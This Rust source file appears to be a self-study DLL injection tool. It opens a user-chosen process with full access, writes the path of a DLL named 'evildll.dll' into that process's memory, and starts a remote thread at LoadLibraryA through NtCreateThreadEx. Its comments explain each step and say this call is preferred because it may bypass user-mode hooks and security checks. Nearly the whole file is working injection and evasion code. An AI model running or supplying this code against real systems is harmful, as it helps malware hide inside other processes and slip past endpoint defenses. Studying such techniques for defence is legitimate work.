use std::io;
use std::ffi::c_void;
use std::mem::size_of_val;
use std::ptr::{null, null_mut};
use std::ptr;
use windows::core::{s, PCSTR};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx};
use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};
use windows::Win32::Foundation::HANDLE;

// Define NtCreateThreadEx for FFI
// [Explain]  What is NtCreateThreadEx, and why define it here?
/*
NtCreateThreadEx is a low-level function for creating a thread in a process, allowing us to inject code in a stealthier way. It's not exposed by default, so we manually define it using Rust’s foreign function interface (FFI). This function is often used in security contexts for creating threads in a way that might bypass typical user-mode checks.
*/

extern "system" {
    fn NtCreateThreadEx(
        thread_handle: *mut HANDLE,
        desired_access: u32,
        object_attributes: *mut c_void,
        process_handle: HANDLE,
        start_address: *const c_void,
        parameter: *const c_void,
        create_flags: u32,
        zero_bits: usize,
        stack_size: usize,
        max_stack_size: usize,
        attribute_list: *mut c_void,
    ) -> u32;
}

fn main() {
    // Collect the Process ID
    let pid: u32 = collect_proc_addr();

    // Open Process with All Access
    // [Explain]Why use OpenProcess, and why is it wrapped in unsafe?
    /*
    OpenProcess returns a handle to the target process, allowing us to perform operations on it. The PROCESS_ALL_ACCESS flag provides full access, necessary for memory allocation and remote thread creation. unsafe is required because it involves direct system calls, which could lead to undefined behavior if misused.
     */
    let h_process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid) };
    let h_process = match h_process {
        Ok(h) => h,
        Err(e) => panic!("[-] Could not get handle to process ID {pid}, error: {e}"),
    };

    // Get handle to kernel32.dll and address of LoadLibraryA
    let h_kernel32 = unsafe { GetModuleHandleA(s!("Kernel32.dll")).expect("Could not get Kernel32.dll") };
    let load_library_fn = unsafe { GetProcAddress(h_kernel32, s!("LoadLibraryA")) }.expect("Could not find LoadLibraryA");

    // Path to DLL
    // [Explain]  What is VirtualAllocEx, and why is memory allocation needed?
    /*
    VirtualAllocEx allocates memory in the remote process’s address space. The DLL path needs to be stored in the target process so that LoadLibraryA can use this path to load the DLL.
     */
    
    //[Explain] Why MEM_COMMIT | MEM_RESERVE and PAGE_EXECUTE_READWRITE?
    /*
MEM_COMMIT | MEM_RESERVE specifies that we’re both reserving and committing memory, making it available immediately. PAGE_EXECUTE_READWRITE allows read, write, and execute permissions, necessary for injected code execution.
     */
    let path_to_dll = "D:\\just_for_fun\\rust\\dll_injection\\target\\debug\\evildll.dll";
    let remote_memory = unsafe {
        VirtualAllocEx(h_process, None, path_to_dll.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    };
    if remote_memory.is_null() {
        panic!("[-] Failed to allocate memory in the remote process");
    }

    // Write DLL Path to the allocated memory in the target process
    let mut bytes_written = 0;
    let write_result = unsafe {
        WriteProcessMemory(
            h_process,
            remote_memory,
            path_to_dll.as_ptr() as *const c_void,
            path_to_dll.len(),
            Some(&mut bytes_written),
        )
    };
    if let Err(e) = write_result {
        panic!("[-] Error writing to remote process memory: {e}");
    }

    // Using NtCreateThreadEx for stealthier injection
    //[Explain] Why use NtCreateThreadEx instead of CreateRemoteThread?
    /*
    NtCreateThreadEx is lower-level than CreateRemoteThread, potentially bypassing user-mode hooks or security checks, making it preferable in stealthy injection contexts.
     */
    let mut thread_handle = HANDLE(null_mut());
    let status = unsafe {
        NtCreateThreadEx(
            &mut thread_handle,
            0x1FFFFF, // THREAD_ALL_ACCESS privilege, granting full access to the new thread.
            ptr::null_mut(),
            h_process,
            load_library_fn as *const c_void,
            remote_memory as *const c_void,
            0, // CreateSuspended = 0, to run immediately
            0,
            0,
            0,
            ptr::null_mut(),
        )
    };

    if status == 0 {
        println!("[+] Successfully injected thread with NtCreateThreadEx!");
    } else {
        println!("[-] NtCreateThreadEx failed with status: {:#X}", status);
    }
}

// Collect Process ID function
fn collect_proc_addr() -> u32 {
    let mut pid = String::new();
    println!("> ");
    io::stdin().read_line(&mut pid).expect("Failed to read PID");
    pid.trim().parse().expect("Invalid PID")
}
